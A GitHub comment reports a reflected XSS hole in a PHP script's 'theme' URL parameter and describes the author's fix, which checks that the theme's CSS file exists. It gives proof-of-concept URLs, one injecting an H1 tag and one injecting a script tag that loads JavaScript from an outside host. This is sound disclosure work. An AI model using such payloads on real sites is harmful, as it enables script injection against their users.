### @liamjack **[liamjack](/liamjack)** commented [May 25, 2017](#issue-231380470) ‚Ä¢ edited Loading

I was encountering a minor PHP Error when not provided a `theme` parameter in the URL:

`Notice: Undefined index: theme in /php/swmp.php on line 77`

I'm using Nginx and PHP7.0-fpm on a debian machine, this quick fix resolves the problem for me.

After digging a little further, I discovered that the `theme` GET parameter was directly used in the HTML output, which results in an [XSS vulnerability](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29) when you feed HTML tags into the `theme` param, quick example:

[![Screenshot example](https://cloud.githubusercontent.com/assets/821228/26460167/1dccbfc6-4179-11e7-9fe8-21beab81dfab.png)](https://cloud.githubusercontent.com/assets/821228/26460167/1dccbfc6-4179-11e7-9fe8-21beab81dfab.png)

Here are some URLs you can try out yourself:

* `http://[your_url]/?theme=test`

  This results in no CSS theme being applied to the page because there is no CSS file called `test.css`
* `http://[your_url]/?theme=%22%3E%3Ch1%3EHELLO%20This%20is%20pretty%20dangerous%3C/h1%3E`

  This allows injecting a big H1 message above all page content (demonstrated in screenshot above)
* `http://[your_url]/?theme=%22%3E%3Cscript%20src=%22http://xss.rocks/xss.js%22%3E%3C/script%3E`

  Injecting remove Javascript files into the page (suprisingly, Chrome blocks this with their "XSS Auditor")

I fixed this vulnerability by first checking if the CSS file actually exists in the `css/themes` folder. If the file doesn't exist, we stick to the default `$config['theme']`.

Sorry, something went wrong.
